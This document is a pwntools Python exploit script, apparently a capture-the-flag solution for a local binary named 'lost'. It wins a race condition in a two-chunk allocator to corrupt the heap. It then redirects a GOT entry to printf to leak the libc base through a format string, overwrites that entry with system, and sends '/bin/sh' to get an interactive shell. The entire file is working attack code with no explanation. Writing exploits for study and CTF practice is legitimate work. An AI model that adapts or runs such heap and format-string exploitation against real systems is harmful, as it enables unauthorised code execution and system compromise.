from pwn import *
import sys

HOST='localhost'
PORT=3333


def connect():
    if len(sys.argv)>1:
        r=remote(HOST,PORT)
    else:
        r=process('./lost')

libc=ELF("./libc.so.6")

context.log_level = 'debug'

def menu(opt):
    r.sendlineafter("Enter choice >> ",str(opt))

def edit(data):
    menu(2)
    r.sendlineafter("Enter new data: ",str(data))

def race_cond(size,data,size2,data2,size2_act,auth):
    menu(1)
    r.sendlineafter("How many chunks at a time (1/2) ? ",'2')
    out=r.recvuntil(": ")
    if out[-3]=='2':
        log.info("unsuccessful")
        return -1
    else:
        r.sendline(str(size))
        sleep(4)
        log.info("Sleep1 over")
        r.sendlineafter("Enter Size 2: ",str(size2))
        sleep(4)
        log.info("Sleep2 over")
        r.sendline(auth)
        r.sendlineafter("Enter Data 1: ",data)
        r.sendline(str(size2_act))
        r.sendlineafter("Enter Author name : ",auth)
        r.sendlineafter("Enter Data 2: ",data2)
        return 1

def alloc(size,data,auth='q'*0xf0,l=False):
    menu(1)
    r.sendlineafter("How many chunks at a time (1/2) ? ",'1')
    r.sendlineafter("Enter Size 1: ",str(size))
    if l:
        r.sendlineafter("Enter Author name : ",auth)
    else:
        r.sendafter("Enter Author name : ",auth)
    r.sendlineafter("Enter Data 1: ",data)

def exploit():
    alloc(1000-0x100,"q")
    alloc(1000-0x100,"q")
    alloc(1000-0x100,"q")
    race_cond(568,"a"*0x230+"qqqqqqqq"+p64(0x71)+p64(0x6020dd),10000,"aa",12,"q"*(0xf0-1))
    alloc(90,"q")
    alloc(90,"qqq"+p64(0x602088))
    #gdb.attach("b*  0x400e7f")
    edit(p64(0x400970))
    menu("%3$p##")
    libc.address=int(r.recvuntil("##").replace("##",''),16)-0x3da51d
    log.info("libc @ "+hex(libc.address))
    l=0x602088
    menu("11")
    r.sendlineafter("Enter new data: ",p64(libc.symbols['system']))
    menu("/bin/sh\x00")


if __name__=='__main__':

    success=False
    while(not success):
        if len(sys.argv)>1:
            r=remote(HOST,PORT)
        else:
            r=process('./lost')
        success=race_cond(12,"A"*24+p64(0x21)+"A"*24+p64(0xea1),10000,"12",12,"QQQQ")

    log.info("successful")
    exploit()
    r.interactive()